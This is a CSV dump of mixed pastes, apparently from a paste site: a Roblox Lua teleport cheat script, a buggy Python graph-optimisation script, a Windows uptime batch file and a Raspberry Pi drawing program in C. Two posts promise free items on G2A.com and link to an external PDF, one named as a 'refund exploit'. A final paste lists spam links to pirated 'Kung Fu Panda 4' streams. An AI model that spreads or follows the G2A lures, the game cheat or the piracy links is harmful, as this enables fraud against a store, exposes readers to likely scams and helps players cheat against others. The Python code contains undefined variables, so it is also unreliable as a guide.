id,title,username,language,date,content
Zuhqfhg1,Teleport Tools,LegendzHackz,Lua,Wednesday 13th of March 2024 12:47:22 PM CDT,"local TweenService = game:GetService(""TweenService"")
local Lighting = game:GetService(""Lighting"")
local Players = game:GetService(""Players"")
local Player = Players.LocalPlayer
local Backpack = Player.Backpack

local Mouse = Player:GetMouse()

function MakeTools()
    for _, Tools in next, Backpack:GetChildren() do
        if Tools:IsA(""Tool"") then
            Tools:Destroy()
        end
    end

    local Teleport = Instance.new(""Tool"", Backpack)
    local LagTP = Instance.new(""Tool"", Backpack)
    local TweenTP = Instance.new(""Tool"", Backpack)

    Teleport.Name = ""TP Tool""
    Teleport.RequiresHandle = false
    Teleport.Activated:Connect(function()
        pcall(function()
    	    Player.Character:MoveTo(Mouse.Hit.p + Vector3.new(0, 3, 0))
        end)
    end)

    LagTP.Name = ""LagTP""
    LagTP.RequiresHandle = false
    LagTP.Activated:Connect(function()
        pcall(function()
            local cOld = Player.Character.HumanoidRootPart.CFrame
            Player.Character:MoveTo(Mouse.Hit.p + Vector3.new(0, 3, 0))
            task.wait(0.25)
            Player.Character.HumanoidRootPart.CFrame = cOld
        end)
    end)

    TweenTP.Name = ""TweenTP""
    TweenTP.RequiresHandle = false
    TweenTP.Activated:Connect(function()
        pcall(function()
            local CDist = (Player.Character.HumanoidRootPart.Position - Mouse.Hit.p).Magnitude
            local CSpeed = CDist/tonumber(math.huge)
            local CTween = TweenService:Create(Player.Character.HumanoidRootPart, TweenInfo.new(CSpeed, Enum.EasingStyle.Linear), {CFrame = CFrame.new(Mouse.Hit.p + Vector3.new(0, 3, 0))})

            CTween:Play()
        end)
    end)
end

MakeTools()

Player.CharacterAdded:Connect(MakeTools)"
zYMkQR5R,Untitled,vatman,Python,Wednesday 13th of March 2024 12:43:27 PM CDT,"import numpy as np
import matplotlib.pyplot as plt
import networkx as nx
from scipy.spatial import distance_matrix
import itertools
from networkx.drawing.layout import fruchterman_reingold_layout


def add_unique_vector(vectors, selected_vectors, remaining_indices):

    # Выбираем случайный индекс из оставшихся
    new_index = np.random.choice(remaining_indices)

    # Добавляем новый выбранный вектор
    selected_vectors.append(vectors[new_index])
    remaining_indices = list(remaining_indices - new_index)

    return selected_vectors, remaining_indices


# Расчет энергии вершины
def calculate_vertex_energy(vertex, vectors, k, l):
    # Вычисляем расстояния от вершины до каждого вектора
    distances = [np.linalg.norm(vertex - vector) for vector in vectors]

    # Получаем индексы векторов, отсортированных по расстоянию
    sorted_indices = np.argsort(distances)

    # Выбираем num_nearest ближайших векторов
    nearest_vector = sorted_indices[0]

    # Вычисляем энергию вершины
    energy = 0

    energy += k * (1 / l) * np.linalg.norm(vertex - nearest_vector) ** 2
    return energy


# Расчет энергии ребра
def calculate_edge_energy(edge, vectors, k, s):
    v1, v2 = vectors[edge[0]], vectors[edge[1]]
    return k * s**2 * np.linalg.norm(v1 - v2) ** 2


# Расчет энергии клина
def calculate_wedge_energy(wedge, vectors, k, r):
    v1, v2, v3 = vectors[wedge[0]], vectors[wedge[1]], vectors[wedge[2]]
    return k * r**4 * np.linalg.norm(v1 + v3 - 2 * v2) ** 2


# Расчет энергии графа
def calculate_energy(
    graph,
    vectors,
    selected_vectors,
    max_vertex_energy,
    max_edge_energy,
    max_wedge_energy,
    max_energy_vertex,
    max_energy_edge,
    max_energy_wedge,
    edge_combination,
):
    # vertex_k = 0.5 # Замените на ваше значение для коэффициента аппроксимации вершин
    # edge_k = 0.5 # Замените на ваше значение для коэффициента растяжения ребер
    # wedge_k = 0.5 # Замените на ваше значение для коэффициента изгиба клиньев
    max_wedge_energy = (
        -np.inf
    )  # Инициализируем максимальную энергию клина как минус бесконечность
    max_energy_wedge = None  # Инициализируем клин с максимальной энергией как None
    edge_combination = 0
    max_vertex_energy = -np.inf
    max_edge_energy = -np.inf
    max_energy_vertex = 0
    max_energy_edge = None

    energy = 0
    for node in graph.nodes:
        vertex_energy = calculate_vertex_energy(
            selected_vectors[int(node)], vectors, vertex_k, len(selected_vectors)
        )
        if vertex_energy > max_vertex_energy:
            max_vertex_energy = vertex_energy
            max_energy_vertex = node
        energy += vertex_energy
    for edge in graph.edges:
        edge_energy = calculate_edge_energy(edge, selected_vectors, edge_k)
        if edge_energy > max_edge_energy:
            max_edge_energy = edge_energy
            max_energy_edge = edge
        energy += edge_energy

    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            # print(""Энергия клина:"")
            # print(p1)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 1
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 2
                # print(""Энергия клина:"")
            # print(p1)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k)
            if wedge_energy > max_wedge_energy:
                max_wedge_energy = wedge_energy
                max_energy_wedge = nodes
                edge_combination = 3
            # print(""Энергия клина:"")
            # print(p1)
            energy += wedge_energy
    return (
        energy,
        max_vertex_energy,
        max_edge_energy,
        max_wedge_energy,
        max_energy_vertex,
        max_energy_edge,
        max_energy_wedge,
        edge_combination,
    )


# Расчет энергии графа
def calculate_energy1(graph, vectors, selected_vectors):
    vertex_k = 2  # Замените на ваше значение для коэффициента аппроксимации вершин
    edge_k = 1  # Замените на ваше значение для коэффициента растяжения ребер
    wedge_k = 0.25
    energy = 0
    for node in graph.nodes:
        vertex_energy = calculate_vertex_energy(
            selected_vectors[int(node)], vectors, vertex_k, len(graph.nodes)
        )
        energy += vertex_energy
    for edge in graph.edges:
        edge_energy = calculate_edge_energy(
            edge, selected_vectors, edge_k, len(graph.edges)
        )
        energy += edge_energy
    r = 0
    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            r = r + 1
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            r = r + 1
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            r = r + 1

    # Добавляем энергию клина для всех подграфов из трех вершин
    for nodes in itertools.combinations(graph.nodes, 3):
        # print(nodes)
        if graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[0], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[1]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
        elif graph.has_edge(nodes[0], nodes[2]) and graph.has_edge(nodes[1], nodes[2]):
            wedge_energy = calculate_wedge_energy(nodes, selected_vectors, wedge_k, r)
            energy += wedge_energy
    return energy


def visualize_graph(vectors, selected_vectors, G):
    fig = plt.figure()
    ax = fig.add_subplot(111, projection=""3d"")

    # Отображаем все векторы на графике
    for vector in vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""b"")

    # Отображаем выбранные векторы на графике
    for vector in selected_vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""r"")

    # Добавляем ребра между вершинами
    for edge in G.edges:
        ax.plot(
            [selected_vectors[edge[0]][0], selected_vectors[edge[1]][0]],
            [selected_vectors[edge[0]][1], selected_vectors[edge[1]][1]],
            [selected_vectors[edge[0]][2], selected_vectors[edge[1]][2]],
            ""r-"",
        )

    # Добавляем оси
    ax.set_xlabel(""X"")
    ax.set_ylabel(""Y"")
    ax.set_zlabel(""Z"")
    plt.show()


def modify_graph(
    G,
    selected_vectors,
    max_vertex_energy,
    max_edge_energy,
    max_wedge_energy,
    max_energy_wedge,
    edge_combination,
    vectors,
    remaining_indices,
):
    if max_vertex_energy >= max_edge_energy and max_vertex_energy >= max_wedge_energy:
        print(""hello1"")
        # Добавляем новую вершину к вершине с наибольшей энергией
        # max_energy_vertex = vertex_energies.index(max_vertex_energy)
        G.add_node(len(selected_vectors))
        G.add_edge(max_energy_vertex, len(selected_vectors))
        selected_vectors, remaining_indices = add_unique_vector(
            vectors, selected_vectors, remaining_indices
        )
        # selected_vectors.append(np.random.randint(-6, 7, 3))  # Добавляем новый вектор
    elif max_edge_energy >= max_vertex_energy and max_edge_energy >= max_wedge_energy:
        print(""hello2"")
        # Разбиваем ребро с наибольшей энергией новой вершиной
        # edges = list(G.edges)  # Получаем список всех ребер
        # max_energy_edge = edges[edge_energies.index(max_edge_energy)]  # Находим ребро с максимальной энергией
        G.add_node(len(selected_vectors))
        G.add_edge(max_energy_edge[0], len(selected_vectors))
        G.add_edge(max_energy_edge[1], len(selected_vectors))
        G.remove_edge(max_energy_edge[0], max_energy_edge[1])
        selected_vectors, remaining_indices = add_unique_vector(
            vectors, selected_vectors, remaining_indices
        )  # Добавляем новый вектор
    else:
        print(""hello3"")
        if edge_combination == 1:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[1]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[2]]
            )
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[2], max_energy_wedge[1])
            else:
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[2], max_energy_wedge[1])
        elif edge_combination == 2:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[1]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[1]]
                - selected_vectors[max_energy_wedge[2]]
            )
            print(f""длина старого ребра: {old_edge_length}"")
            print(f""длина нового ребра: {new_edge_length }"")
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[2])
            else:
                G.remove_edge(max_energy_wedge[1], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[2])
        elif edge_combination == 3:
            old_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[0]]
                - selected_vectors[max_energy_wedge[2]]
            )
            new_edge_length = np.linalg.norm(
                selected_vectors[max_energy_wedge[1]]
                - selected_vectors[max_energy_wedge[2]]
            )
            if new_edge_length < old_edge_length:
                # Удаляем старое ребро и добавляем новое
                G.remove_edge(max_energy_wedge[0], max_energy_wedge[2])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[1])
            else:
                G.remove_edge(max_energy_wedge[2], max_energy_wedge[1])
                G.add_edge(max_energy_wedge[0], max_energy_wedge[1])
        # print(max_energy_wedge[0])
        # print(max_energy_wedge[1])
        # print(max_energy_wedge[2])
    return G, selected_vectors, remaining_indices
    # for edges in G.edges:
    # print(edges)


def calculate_psi(g, NP, lambda_):
    return ((g - 1) * (NP + 1) + 1) ** (1 / lambda_)


def calculate_probabilities(
    vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, g, NP, lambda_
):
    # Вычисляем psi
    psi_g = calculate_psi(g, NP, lambda_)

    # Вычисляем энергии для всех векторов
    energies = [
        calculate_energy1(graphs[i], vectors, selected_vectors_list[i]) ** psi_g
        for i in range(len(selected_vectors_list))
    ]

    # Вычисляем сумму энергий
    sum_energies = sum(energies)

    # Вычисляем вероятности
    probabilities = [energy / sum_energies for energy in energies]
    # print(probabilities)
    return probabilities


def select_support_vector(
    vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, g, NP, lambda_
):
    # Вычисляем вероятности
    probabilities = calculate_probabilities(
        vectors,
        graphs,
        selected_vectors_list,
        vertex_k,
        edge_k,
        wedge_k,
        g,
        NP,
        lambda_,
    )

    # Выбираем опорный вектор на основе вероятностей
    id = np.random.choice(len(selected_vectors_list), p=probabilities)
    support_vector = selected_vectors_list[id]

    return support_vector


def calculate_A(x_min, x_max, x_r, e):
    return (np.arctan((x_max - x_r) / e) - np.arctan((x_min - x_r) / e)) ** -1


def calculate_e(i, g, NP, D):
    return 1 / ((g - 1) * (NP + 1) + i + 1) ** (1 / (2 * D))


def generate_potential_offspring(x_r, e, A):
    return x_r + e * np.tan((np.random.rand() - 0.5) * A)


def crossover(selected_vectors_list, potential_offspring, q):
    # Создаем mutant_vectors, равный по размеру selected_vectors
    mutant_vectors = potential_offspring

    # Заменяем случайные q векторов mutant_vectors на соответствующие векторы из selected_vectors

    # Для оставшихся векторов
    for l in range(q, len(selected_vectors_list)):
        for j in range(len(selected_vectors_list[l])):
            # Выбираем случайное число
            p = np.random.rand()
            # Вычисляем CR_{l,g}
            CR_lg = 0.9 if p > 0.1 else p
            # Для каждой координаты j в векторе
            if np.random.rand() < 1.0 - CR_lg:
                mutant_vectors[l], [j] = selected_vectors_list[l], [j]

    return mutant_vectors


def generate_offspring(selected_vectors_list, support_vector, g, NP):
    # Вычисляем x_min и x_max для каждой координаты
    x_min = []
    x_max = []
    for i in range(len(selected_vectors_list)):
        x_min_i = []
        x_max_i = []
        for j in range(len(selected_vectors_list[i])):
            x_min_i.append(np.min(selected_vectors_list[i][j]))
            x_max_i.append(np.max(selected_vectors_list[i][j]))
        x_min.append(x_min_i)
        x_max.append(x_max_i)

    # Создаем список для хранения потенциальных потомков
    potential_offspring = []

    # Для каждого вектора в selected_vectors
    for i in range(len(selected_vectors_list)):
        # Для каждой координаты в векторе
        potential_offspring_i = []
        for j in range(len(selected_vectors_list[i])):
            # Вычисляем x_r, e и A
            x_r = support_vector[j]
            e = calculate_e(i, g, NP, len(selected_vectors_list[i]))
            A = calculate_A(-1, 1, x_r, e)

            # Генерируем потенциального потомка
            x_star = generate_potential_offspring(x_r, e, A)

            # Добавляем потенциального потомка в список
            potential_offspring_i.append(x_star)
        potential_offspring.append(potential_offspring_i)

    return potential_offspring


def selection(G, vectors, selected_vectors, mutant_vectors, energy):
    # Для каждого вектора в selected_vectors
    for i in range(len(selected_vectors)):
        vec = selected_vectors
        vec[i] = mutant_vectors[i]
        en = calculate_energy1(G, vectors, vec)

        if en < energy:
            selected_vectors[i] = mutant_vectors[i]

    return selected_vectors


def data():
    n = 12

    # Создаем случайную последовательность n-2 от 0 до n-1
    prufer_sequence = np.random.randint(0, n, n - 2)

    # Восстанавливаем дерево по коду Прюфера
    G1 = nx.from_prufer_sequence(prufer_sequence)

    # Укладываем вершины графа на плоскость методом Фрухтермана-Рейнгольда
    pos = fruchterman_reingold_layout(G1, dim=3)

    # Берем точки на ребрах графа
    edge_points = [pos[node] for node in G1.nodes]
    # [(pos[edge[0]] + pos[edge[1]]) / 2 for edge in G.edges]

    # Смещаем каждую точку на случайный вектор с нормальным распределением
    vectors = []
    for point in edge_points:
        for _ in range(5):  # Создаем три смещенные точки для каждой точки на ребре
            vectors.append(point + np.random.normal(size=3) * 0.05)
    return vectors


def visualize_graphs(vectors, graphs, selected_vectors_list):
    fig = plt.figure()
    ax = fig.add_subplot(111, projection=""3d"")

    # Отображаем все векторы на графике
    for vector in vectors:
        ax.scatter(vector[0], vector[1], vector[2], color=""b"")
    color_i = [
        ""red"",
        ""blue"",
        ""green"",
        ""yellow"",
        ""orange"",
        ""lightcoral"",
        ""darkorange"",
        ""olive"",
        ""teal"",
        ""violet"",
        ""skyblue"",
    ]
    # Отображаем выбранные векторы на графике
    for i in range(len(selected_vectors_list)):
        for vector in selected_vectors_list[i]:
            ax.scatter(vector[0], vector[1], vector[2], color=color_i[i % len(color_i)])

    # Добавляем ребра между вершинами
    for i in range(len(graphs)):
        for edge in graphs[i].edges:
            ax.plot(
                [
                    selected_vectors_list[i][edge[0]][0],
                    selected_vectors_list[i][edge[1]][0],
                ],
                [
                    selected_vectors_list[i][edge[0]][1],
                    selected_vectors_list[i][edge[1]][1],
                ],
                [
                    selected_vectors_list[i][edge[0]][2],
                    selected_vectors_list[i][edge[1]][2],
                ],
                color_i[i % len(color_i)],
            )

    # Добавляем оси
    ax.set_xlabel(""X"")
    ax.set_ylabel(""Y"")
    ax.set_zlabel(""Z"")
    plt.show()


def create_auxiliary_variables(NP):
    max_wedge_energy = [-np.inf] * NP
    max_energy_wedge = [None] * NP
    edge_combination = [0] * NP
    max_vertex_energy = [-np.inf] * NP
    max_edge_energy = [-np.inf] * NP
    max_energy_vertex = [0] * NP
    max_energy_edge = [None] * NP
    return (
        max_wedge_energy,
        max_energy_wedge,
        edge_combination,
        max_vertex_energy,
        max_edge_energy,
        max_energy_vertex,
        max_energy_edge,
    )


def DFS(G, v, visited=None):
    if visited is None:
        visited = set()
    visited.add(v)
    for neighbour in G[v]:
        if neighbour not in visited:
            DFS(G, neighbour, visited)
    return visited


def generate_graphs(vectors, NP):
    graphs = []
    selected_vectors_list = []
    remaining_indices_list = []

    for _ in range(NP):
        indices = np.random.choice(len(vectors), 3, replace=False)
        selected_vectors = [vectors[i] for i in indices]
        all_indices = set(range(len(vectors)))
        remaining_indices = list(all_indices - set(indices))

        distances = distance_matrix(selected_vectors, selected_vectors)
        np.fill_diagonal(distances, np.inf)

        dist_vector_pairs = [
            (np.min(dist), vec) for dist, vec in zip(distances, selected_vectors)
        ]
        dist_vector_pairs.sort(key=lambda x: x[0])
        sorted_vectors = [pair[1] for pair in dist_vector_pairs]
        selected_vectors = sorted_vectors

        distances = distance_matrix(selected_vectors, selected_vectors)
        np.fill_diagonal(distances, np.inf)

        G = nx.Graph()
        for i in range(len(selected_vectors)):
            G.add_node(i)

        visited = set()
        for i in range(len(selected_vectors)):
            nearest_vertex = np.argmin(distances[i])
            if i not in visited:
                G.add_edge(i, nearest_vertex)
                visited.add(nearest_vertex)

        connected = len(DFS(G, 0)) == len(G)
        if not connected:
            components = [list(c) for c in nx.connected_components(G)]
            for i in range(len(components) - 1):
                G.add_edge(components[i][0], components[i + 1][0])

        graphs.append(G)
        selected_vectors_list.append(selected_vectors)
        remaining_indices_list.append(remaining_indices)

    return graphs, selected_vectors_list, remaining_indices_list


if __name__ == ""__main__"":
    vertex_k = 10  # Замените на ваше значение для коэффициента аппроксимации вершин
    edge_k = 100  # Замените на ваше значение для коэффициента растяжения ребер
    wedge_k = 10  # Замените на ваше значение для коэффициента изгиба клиньев
    NP = 5
    np.random.seed(8)

    vectors = []
    vectors = data()

    graphs, selected_vectors_list, remaining_indices_list = generate_graphs(vectors, NP)
    (
        max_wedge_energy,
        max_energy_wedge,
        edge_combination,
        max_vertex_energy,
        max_edge_energy,
        max_energy_vertex,
        max_energy_edge,
    ) = create_auxiliary_variables(NP)
    # visualize_graphs(vectors, graphs,selected_vectors_list)
    # print(calculate_probabilities(vectors,graphs, selected_vectors_list, vertex_k,edge_k,wedge_k, 1, NP, 1))
    for i in range(2250):
        support_vector = select_support_vector(
            vectors, graphs, selected_vectors_list, vertex_k, edge_k, wedge_k, 1, NP, 1
        )
        potential_offspring = generate_offspring(
            selected_vectors_list, support_vector, 1, NP
        )
        # visualize_graphs(vectors, graphs, potential_offspring)
        mutant_vectors = crossover(selected_vectors_list, potential_offspring, 3)
        for j in range(len(mutant_vectors)):
            energy_mutant = calculate_energy1(graphs[j], vectors, mutant_vectors[j])
            energy_selected = calculate_energy1(
                graphs[j], vectors, selected_vectors_list[j]
            )
            if energy_mutant < energy_selected:
                selected_vectors_list[j] = mutant_vectors[j]
    visualize_graphs(vectors, graphs, mutant_vectors)"
hcnth3iV,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Wednesday 13th of March 2024 12:08:25 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://drive.google.com/file/d/18wkCPszoWYuV0cI1XJ6gkhxn9ic2VVPa/view?usp=sharing
or
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
13 March 2024















































"
gCS8WzgQ,uptime.bat,vartik,Winbatch,Wednesday 13th of March 2024 12:04:23 PM CDT,"@echo off
rem Version: 1.0
set loadsamples=60
set loaddivisor=16

rem https://stackoverflow.com/questions/6359820/how-to-set-commands-output-as-a-variable-in-a-batch-file
::::: ---- defining the assign macro ---- ::::::::
setlocal DisableDelayedExpansion
(set LF=^
%=EMPTY=%
)
set ^""\n=^^^%LF%%LF%^%LF%%LF%^^""

::set argv=Empty
set assign=for /L %%n in (1 1 2) do ( %\n%
   if %%n==2 (%\n%
      setlocal enableDelayedExpansion%\n%
      for /F ""tokens=1,2 delims=,"" %%A in (""!argv!"") do (%\n%
         for /f ""tokens=* delims="" %%# in ('%%~A') do endlocal^&set ""%%~B=%%#"" %\n%
      ) %\n%
   ) %\n%
) ^& set argv=,

::::: -------- ::::::::

setlocal enableextensions enabledelayedexpansion

rem NOW
set now=%time:~0,8%
rem FIXME: zero padding instead space

rem USERS
%assign% qwinsta ^| findstr /r /c:""^...................[^ ]"" ^| find /v /c "" ID "",users
set userstring=%users% user
if %users% leq 9 set userstring= %userstring%
if not %users% == 1 set userstring=%userstring%s

rem UPTIME
%assign% wmic path Win32_PerfFormattedData_PerfOS_System Get SystemUptime ^| findstr /r /c:""[0-9]"",uptimes
set /a uptimes=%uptimes%, uptimed=uptimes / 86400, uptimes %%= 86400, uptimeh=uptimes / 3600, uptimes %%= 3600, uptimem=uptimes / 60, uptimes=uptimes %% 60
if %uptimeh% leq 9 set uptimeh= %uptimeh%
if %uptimem% leq 9 set uptimem=0%uptimem%
set uptimestring=%uptimeh%:%uptimem%
if %uptimed% gtr 0 set uptimestring=%uptimed% days, %uptimestring%

rem LOAD AVERAGE
set sum=
for /f ""tokens=2 delims=,"" %%n in ('typeperf -sc %loadsamples% ""\Processor(_Total)\%% Processor Time"" ^| findstr /r /c:""\""""[0-9]""') do (
	set n=%%n
	set n=!n:""=!
	set /a sum+=n
)
set /a load=sum*100/loadsamples/loaddivisor
set load=00%load%
set load=%load:~-3,1%.%load:~-2%

set msg= %now% up %uptimestring%, %userstring%,  load average: %load%, %load%, %load%
echo %msg%

rem If parameter is given, send to syslog server
if not [%1] == [] (
	%~dp0logger.exe >nul -l %1 -p user.info -t logger ""%msg%""
	rem https://www.adiscon.com/adiscon-tools/an-unix-like-logger-for-windows/
)
"
RQm8YWcc,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Wednesday 13th of March 2024 11:55:44 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_567329.pdf

Working as of:
13 March 2024





















"
1iGFjkTH,laggyC.c,j0h,C,Wednesday 13th of March 2024 11:30:46 AM CDT,"#include <SDL2/SDL.h>
#include <wiringPi.h>
#include <stdio.h>
#include <unistd.h>
//compile with gcc -g -Wall prog.c -o prog -lwiringPi -lSDL2 
#define SCREEN_WIDTH  1200
#define SCREEN_HEIGHT 650

int cR, cB, cG = 255;
int current_color_index = 0;
int alpha = 0;
// Button function proto types

void erase();

void init();
// still gets  real slow in full screen
// Expanded swap file size is /etc/dphys-swapfile to 2048 max lines 100k 
// Encoder positions
int x_coord = 256;
int y_coord = 256;
int prev_x_coord = 256;
int prev_y_coord = 256;

// GPIO pins for the encoders
const int encoder2_pins[2] = {4, 5}; // A and B pins for encoder 1 (y-axis)
const int encoder1_pins[2] = {16, 15}; // A and B pins for encoder 2 (x-axis)

const int clear_Btn = 26;


// Variables to store encoder state
int encoder1_last_state = 0;
int encoder2_last_state = 0;

// Initialize SDL
//SDL_Init(SDL_INIT_VIDEO);
SDL_Window* window = NULL;
SDL_Renderer* renderer = NULL;

// List to store the points of the lines
typedef struct {
    int x1;
    int y1;
    int x2;
    int y2;
} Line;

#define MAX_LINES 10000
Line lines[MAX_LINES];
int num_lines = 0;

void add_line(int x1, int y1, int x2, int y2) {
    if (num_lines < MAX_LINES) {
        lines[num_lines].x1 = x1;
        lines[num_lines].y1 = y1;
        lines[num_lines].x2 = x2;
        lines[num_lines].y2 = y2;
        num_lines++;
    }
}

void encoder1_callback(void) {
    int a = digitalRead(encoder1_pins[0]);
    int b = digitalRead(encoder1_pins[1]);
    int new_state = (a << 1) | b;
    if ((encoder1_last_state == 0b00 && new_state == 0b10) || (encoder1_last_state == 0b11 && new_state == 0b01)) {
        x_coord += 12;
    } else if ((encoder1_last_state == 0b10 && new_state == 0b00) || (encoder1_last_state == 0b01 && new_state == 0b11)) {
        x_coord -= 12;
    }
    encoder1_last_state = new_state;
}

void encoder2_callback(void) {
    int a = digitalRead(encoder2_pins[0]);
    int b = digitalRead(encoder2_pins[1]);
    int new_state = (a << 1) | b;
    if ((encoder2_last_state == 0b00 && new_state == 0b10) || (encoder2_last_state == 0b11 && new_state == 0b01)) {
        y_coord += 12;
    } else if ((encoder2_last_state == 0b10 && new_state == 0b00) || (encoder2_last_state == 0b01 && new_state == 0b11)) {
        y_coord -= 12;
    }
    encoder2_last_state = new_state;
}

int main(int argc, char* args[]) {
    // Initialize WiringPi
    init();

    // Initialize SDL
    SDL_Init(SDL_INIT_VIDEO);
    window = SDL_CreateWindow(""Sketch -Y- Etch"", SDL_WINDOWPOS_UNDEFINED, SDL_WINDOWPOS_UNDEFINED, SCREEN_WIDTH, SCREEN_HEIGHT, SDL_WINDOW_SHOWN);
    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);

    // Main loop
    SDL_Event event;
    int quit = 0;
    while (!quit) {
        // Check for encoder events
        if (digitalRead(encoder1_pins[0]) != (encoder1_last_state & 0x01) ||
            digitalRead(encoder1_pins[1]) != ((encoder1_last_state >> 1) & 0x01)) {
            encoder1_callback();
        }
        if (digitalRead(encoder2_pins[0]) != (encoder2_last_state & 0x01) ||
            digitalRead(encoder2_pins[1]) != ((encoder2_last_state >> 1) & 0x01)) {
            encoder2_callback();
        }
	if (digitalRead(clear_Btn) == HIGH){
	    erase(); 
               }

        // Check for key events
        while (SDL_PollEvent(&event)) {
            if (event.key.keysym.sym == SDLK_q) {
                quit = 1;
            } 	
         }

        // Draw to screen
        SDL_SetRenderDrawColor(renderer, 0, 0, 0, alpha);
        SDL_RenderClear(renderer);
        SDL_SetRenderDrawColor(renderer, cR, cG, cB, alpha);
        for (int i = 0; i < num_lines; i++) {
            SDL_RenderDrawLine(renderer, lines[i].x1, lines[i].y1, lines[i].x2, lines[i].y2);
        }
        SDL_RenderDrawLine(renderer, prev_x_coord, prev_y_coord, x_coord, y_coord);
        SDL_RenderPresent(renderer);

        // Store the current line
        add_line(prev_x_coord, prev_y_coord, x_coord, y_coord);
        prev_x_coord = x_coord;
        prev_y_coord = y_coord;

        SDL_Delay(10);
    }
    // Cleanup
    SDL_DestroyRenderer(renderer);
    SDL_DestroyWindow(window);
    SDL_Quit();
    return 0;
}

void init(){
    // Initialize WiringPi
    wiringPiSetup();
    // Encoders
    pinMode(encoder1_pins[0], INPUT);
    pinMode(encoder1_pins[1], INPUT);
    pinMode(encoder2_pins[0], INPUT);
    pinMode(encoder2_pins[1], INPUT);
    // Buttons
    pinMode(clear_Btn,INPUT);

	}
	
void erase(){
    x_coord = 256;
    y_coord = 256;
    prev_x_coord = 256;
    prev_y_coord = 256;
    num_lines = 0; //errase lines
    // Clear the screen
    SDL_DestroyRenderer(renderer);
    renderer = SDL_CreateRenderer(window, -1, SDL_RENDERER_ACCELERATED);
    SDL_SetRenderDrawColor(renderer, 0, 0, 0, alpha); // Set drawing color to black
    SDL_RenderClear(renderer); // Clear the screen
    SDL_RenderPresent(renderer); // Update the screen
    }
"
FCnd0djM,dcvsevrbr,gadungw71,PHP,Wednesday 13th of March 2024 10:53:51 AM CDT,"https://github.com/Kung-Fu-Panda-4-2024-UHD-THAISUB
https://github.com/kung-fu-panda-4-HD-1080i-2024-thai-sub
https://github.com/4-1080PX-Kung-Fu-Panda-4-THAI
https://www.charidy.com/1710338637326394888
https://www.charidy.com/1710338825649052013
https://www.charidy.com/1710339051860691939
https://torre.ai/42024kungfupanda4hdthai?r=EFmhglqZ
https://torre.ai/kungfupanda4hd2024?r=7mFzLuLg
https://torre.ai/42024?r=k1eufOMQ
https://www.goodreads.com/list/show/199238._KUNG_FU_PANDA_4_4_2024_HD_1080p
https://www.goodreads.com/list/show/199239._4_Kung_Fu_Panda_4_2024_4K_1080P_
https://wandering.flarum.cloud/d/48839-kungfupanda4full4kthaisub
https://click4r.com/posts/g/15105455/bersamamu
https://forum.webnovel.com/d/169538-hd-4-kung-fu-panda-4-qhd4k
https://hiuderyy.hashnode.dev/taksemudahituu
https://www.taskade.com/p/awvrwarcesntesvtdrmy-01HRW6EWD1PQWBZ9MT35HZ9Y4E
https://open.firstory.me/story/cltpybfyc0eoz01si2xkgf584
https://telegra.ph/MANGUHUCUY-03-13
